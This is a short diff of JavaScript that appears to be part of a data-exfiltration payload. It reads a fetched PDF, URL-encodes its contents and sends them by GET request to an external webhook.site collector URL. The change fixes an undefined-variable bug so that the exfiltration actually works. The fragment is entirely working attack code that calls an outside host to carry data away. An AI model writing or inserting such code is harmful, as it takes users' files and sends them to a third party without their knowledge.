@@ -20,7 +20,7 @@ xhr.onload = function() { // Set the callback function to handle the response
           const pdfContent = encodeURIComponent(reader.result); // Get the URL-encoded content of the PDF file
           
           // Send the PDF content to the webhook
-          const webhookUrl = "https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=" + pdfContent1; //
+          const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(reader.result)}`;
           const webhookRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
           webhookRequest.open("GET", webhookUrl); // Set the request method and endpoint
           webhookRequest.send(); // Send the request with no data, since the PDF content is in the URL parameter
